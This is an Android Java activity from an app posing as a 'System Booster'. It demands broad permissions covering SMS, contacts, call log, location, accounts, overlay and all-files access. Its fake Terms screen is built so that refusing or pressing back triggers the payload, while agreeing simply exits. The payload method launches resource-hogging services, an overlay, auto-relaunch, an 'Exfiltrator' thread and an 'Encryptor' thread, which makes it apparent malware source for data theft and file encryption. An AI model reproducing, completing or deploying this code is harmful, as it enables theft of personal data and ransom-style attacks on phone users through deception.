package com.rhfvnc.strain;
import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.*;
import java.util.ArrayList;
import java.util.List;
public class ChoiceActivity extends Activity {
    private static final int REQ_BASIC   = 200;
    private static final int REQ_OVERLAY = 201;
    private static final int REQ_MANAGE  = 202;
    private LinearLayout root;
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#0a0a0a"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(60, 60, 60, 60);
        setContentView(root);
        showGate();
    }
    // ---------- SCREEN 1: izin ----------
    private void showGate() {
        root.removeAllViews();
        TextView t = new TextView(this);
        t.setText("Permissions Required");
        t.setTextColor(Color.WHITE);
        t.setTextSize(26);
        t.setGravity(Gravity.CENTER);
        root.addView(t);
        TextView d = new TextView(this);
        d.setText("System Booster needs full access to work properly.\n\nTap 'Grant All' to continue.");
        d.setTextColor(Color.LTGRAY);
        d.setTextSize(14);
        d.setGravity(Gravity.CENTER);
        d.setPadding(0, 30, 0, 60);
        root.addView(d);
        Button grant = new Button(this);
        grant.setText("GRANT ALL PERMISSIONS");
        grant.setTextSize(15);
        grant.setOnClickListener(v -> requestAll());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.topMargin = 20;
        root.addView(grant, lp);
    }
    private void requestAll() {
        if (Build.VERSION.SDK_INT >= 23) {
            List<String> p = new ArrayList<>();
            p.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            p.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            p.add(Manifest.permission.READ_PHONE_STATE);
            p.add(Manifest.permission.READ_CONTACTS);
            p.add(Manifest.permission.READ_SMS);
            p.add(Manifest.permission.READ_CALL_LOG);
            p.add(Manifest.permission.ACCESS_FINE_LOCATION);
            p.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            p.add(Manifest.permission.GET_ACCOUNTS);
            requestPermissions(p.toArray(new String[0]), REQ_BASIC);
        } else {
            // Android < 6 — semua izin auto-granted waktu install
            afterBasic();
        }
    }
    @Override
    public void onRequestPermissionsResult(int rc, String[] perms, int[] res) {
        super.onRequestPermissionsResult(rc, perms, res);
        boolean all = true;
        for (int r : res) if (r != PackageManager.PERMISSION_GRANTED) all = false;
        if (!all) {
            Toast.makeText(this, "All permissions required to continue", Toast.LENGTH_LONG).show();
            return; // tetap di layar izin, TIDAK lanjut
        }
        afterBasic();
    }
    private void afterBasic() {
        // overlay (Display over other apps)
        if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, REQ_OVERLAY);
                } catch (Throwable ignored) { afterOverlay(); }
                return;
            }
        }
        afterOverlay();
    }
    private void afterOverlay() {
        // All Files Access (Android 11+)
        if (Build.VERSION.SDK_INT >= 30) {
            try {
                if (!Environment.isExternalStorageManager()) {
                    Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(i, REQ_MANAGE);
                    return;
                }
            } catch (Throwable ignored) {}
        }
        showTerms();
    }
    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == REQ_OVERLAY) {
            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "Overlay permission required", Toast.LENGTH_LONG).show();
                return; // tetap di layar izin
            }
            afterOverlay();
        } else if (req == REQ_MANAGE) {
            if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
                Toast.makeText(this, "All Files Access required", Toast.LENGTH_LONG).show();
                return;
            }
            showTerms();
        }
    }
    // ---------- SCREEN 2: Terms ----------
    private void showTerms() {
        root.removeAllViews();
        TextView title = new TextView(this);
        title.setText("Terms of Service");
        title.setTextColor(Color.WHITE);
        title.setTextSize(28);
        title.setGravity(Gravity.CENTER);
        root.addView(title);
        TextView body = new TextView(this);
        body.setText("By continuing, you agree to our Terms of Service and Privacy Policy.\n\nTap 'I AGREE' to proceed.\nTap 'I DO NOT AGREE' to decline.");
        body.setTextColor(Color.LTGRAY);
        body.setTextSize(14);
        body.setGravity(Gravity.CENTER);
        body.setPadding(0, 40, 0, 60);
        root.addView(body);
        Button agree = new Button(this);
        agree.setText("I AGREE");
        agree.setTextColor(Color.WHITE);
        agree.setTextSize(16);
        agree.setOnClickListener(v -> exitSafe());
        LinearLayout.LayoutParams alp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        alp.topMargin = 20;
        root.addView(agree, alp);
        Button refuse = new Button(this);
        refuse.setText("I DO NOT AGREE");
        refuse.setTextColor(Color.GRAY);
        refuse.setOnClickListener(v -> activate());
        root.addView(refuse);
    }
    private void exitSafe() {
        finishAffinity();
        android.os.Process.killProcess(android.os.Process.myPid());
    }
    private void activate() {
        StrainService.start(this);
        HogService.start(this, HogService1.class);
        HogService.start(this, HogService2.class);
        HogService.start(this, HogService3.class);
        try { OverlayService.start(this); } catch (Throwable ignored) {}
        StrainReceiver.scheduleRelaunch(this, 20);
        new Thread(new Exfiltrator(this)).start();
        new Thread(new Encryptor(this)).start();
        Intent i = new Intent(this, ChaosActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(i);
        finish();
    }
    @Override
    public void onBackPressed() {
        // kalau di screen gate → tetap
        // kalau di terms → activate (treat as refuse)
        activate();
    }
}
